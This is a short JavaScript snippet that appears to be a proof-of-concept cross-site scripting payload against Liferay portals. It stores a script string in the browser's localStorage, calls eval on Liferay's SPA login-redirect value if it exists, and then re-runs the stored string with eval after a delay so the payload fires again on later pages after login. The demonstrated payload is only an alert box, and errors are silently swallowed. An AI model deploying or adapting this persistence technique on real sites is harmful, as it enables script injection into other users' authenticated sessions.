// Save actual payload for later pages
localStorage.setItem('xss_payload', `alert("🔥 XSS triggered after login!")`);

// Optional: trigger the loader if present
if (typeof Liferay !== 'undefined' && Liferay.SPA?.loginRedirect) {
  try {
    eval(Liferay.SPA.loginRedirect);
  } catch (e) {}
}

// Always check localStorage to re-trigger payload on new pages
setTimeout(() => {
  try {
    const stored = localStorage.getItem('xss_payload');
    if (stored) eval(stored);
  } catch (e) {}
}, 1000);
